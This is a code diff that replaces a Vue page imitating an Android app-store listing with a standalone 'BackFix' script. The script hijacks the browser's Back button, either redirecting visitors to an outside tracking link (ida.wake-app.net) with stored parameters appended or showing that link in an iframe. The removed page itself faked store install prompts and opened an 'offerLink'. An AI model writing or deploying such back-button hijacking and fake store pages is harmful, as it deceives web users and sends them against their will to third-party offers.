@@ -1,80 +1,28 @@
-<template>
-	<AndroidLayout>
-		<AppBar />
-		<AppTitle />
-		<AppStats />
-		<AppDownloads />
-		<AppImgGallery />
-		<AppAbout />
-		<AppFullAbout />
-		<AppRating />
-		<AppReviews />
-		<AppFullReviews />
-		<AppDeveloper />
-		<AppFooter />
-		<AppNotice />
-		<AppRedirectPopUp
-			description="you need to go to the browser"
-			title="To install the application"
-			buttonText="Go to browser"
-			v-if="mainStoreApp.redirectToGoogle"
-		/>
-		<AppAcceptInstal v-if="mainStoreApp.showAcceptInstall" />
+const scriptTag = document.currentScript
+//If redirect is true, then after back button click there will be a redirect to the backLink.
+//Else backLink will be shown using an iframe
+const redirect = scriptTag.hasAttribute('data-redirect')
+	? scriptTag.getAttribute('data-redirect') == 'true'
+	: false
 
-		<ChangeFocusPopUp
-			@click="showFocusPopUp = false"
-			v-if="showFocusPopUp == true"
-		/>
-	</AndroidLayout>
-</template>
+const backLink =
+	'https://ida.wake-app.net/4rr8Dk' +
+		localStorage.getItem('construct_params') ?? ''
 
-<script setup lang="ts">
-import { useRouter } from 'vue-router'
-import { ref } from 'vue'
-import Loader from '../components/AppLoader.vue'
-import AppBar from '../components/AppBar.vue'
-import AppTitle from '../components/AppTitle.vue'
-import AppStats from '../components/AppStats.vue'
-import AppDownloads from '../components/AppDownloads.vue'
-import AppImgGallery from '../components/AppImgGallery.vue'
-import AppAbout from '../components/AppAbout.vue'
-import AppFullAbout from '../components/AppFullAbout.vue'
-import AppRating from '../components/AppRating.vue'
-import AppReviews from '../components/AppReviews.vue'
-import AppFullReviews from '../components/AppFullReviews.vue'
-import AppDeveloper from '../components/AppDeveloper.vue'
-import AppFooter from '../components/AppFooter.vue'
-import ChangeFocusPopUp from '../components/change_focus_popup.vue'
-import AppNotice from '../components/AppNotice.vue'
-import AppRedirectPopUp from '../components/AppRedirectPopUp.vue'
-import AppAcceptInstal from '../components/AppAcceptInstal.vue'
-import { onMounted } from 'vue'
-import AndroidLayout from '../layouts/default.vue'
-import { mainStore } from '../stores/main_store.ts'
-import { androidAssetsStore } from '../stores/android_store.ts'
-import * as lox from '../stores/backfix_store'
-import { readCookie } from '../utils/cookie'
-const mainStoreApp = mainStore()
-const androidStore = androidAssetsStore()
-const leavePage = ref(false)
-const router = useRouter()
-const showFocusPopUp = ref(false)
+//An url that the user will see in an iframe after (s)he clicks Back SECOND TIME
+const showcaseLink = backLink
+//If true, then debug info will be printed to console
+const traceEnabled = scriptTag.hasAttribute('data-traceenabled')
+	? scriptTag.getAttribute('data-traceenabled') == 'true'
+	: false
 
-const backFix = () => {
-	const redirect = true
+//Using "true" for this attribute you can temporary turn off the script
+const isOff = scriptTag.hasAttribute('data-isoff')
+	? scriptTag.getAttribute('data-isoff') == 'true'
+	: false
 
-	const backLink = ''
-
-	//An url that the user will see in an iframe after (s)he clicks Back SECOND TIME
-	const showcaseLink = backLink
-	//If true, then debug info will be printed to console
-	const traceEnabled = false
-
-	//Using "true" for this attribute you can temporary turn off the script
-	const isOff = false
-
-	//Don't edit anything down below if you are not sure, what you are doing!
-
+//Don't edit anything down below if you are not sure, what you are doing!
+document.addEventListener('DOMContentLoaded', function () {
 	if (isOff) {
 		trace('BackFix switched OFF! Exiting...')
 		return
@@ -129,7 +77,7 @@ const backFix = () => {
 				case 1:
 					trace('Time to show landing!')
 					if (redirect) {
-						showFocusPopUp.value = true
+						window.location.href = backLink
 					} else {
 						showFrame(frameName)
 						createFrame(showcaseFrameName, showcaseLink)
@@ -258,70 +206,4 @@ const backFix = () => {
 			console.log('%c' + msg, style)
 		}
 	}
-}
-backFix()
-document.addEventListener('visibilitychange', event => {
-	if (document.visibilityState == 'visible') {
-	} else {
-		showFocusPopUp.value = true
-	}
 })
-
-function getBrowserLocales(options = {}) {
-	const defaultOptions = {
-		languageCodeOnly: false,
-	}
-	const opt = {
-		...defaultOptions,
-		...options,
-	}
-	const browserLocales =
-		navigator.languages === undefined
-			? [navigator.language]
-			: navigator.languages
-	if (!browserLocales) {
-		return undefined
-	}
-	return browserLocales.map(locale => {
-		const trimmedLocale = locale.trim()
-		return opt.languageCodeOnly ? trimmedLocale.split(/-|_/)[0] : trimmedLocale
-	})
-}
-const defaultLanguage = ref(getBrowserLocales({ languageCodeOnly: true })[0])
-function changeLanguage() {
-	window.location = `#googtrans(${defaultLanguage.value})`
-}
-function loadGoogleTranslateScript() {
-	const script = document.createElement('script')
-	script.src =
-		'//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit'
-	script.async = true
-	document.head.appendChild(script)
-
-	window.googleTranslateElementInit = () => {
-		new window.google.translate.TranslateElement(
-			{
-				pageLanguage: 'en',
-				layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-				autoDisplay: false,
-			},
-			'google_translate_element'
-		)
-	}
-}
-
-onMounted(() => {
-	const internalHandler = async e => {
-		e.preventDefault() // required in some browsers
-		e.returnValue = '' // required in some browsers
-		if (localStorage.getItem('resources')) {
-			await mainStoreApp.openWeb(JSON.parse(readCookie('offerLink')))
-		}
-	}
-
-	loadGoogleTranslateScript()
-	changeLanguage()
-})
-</script>
-
-<style scoped lang="scss"></style>
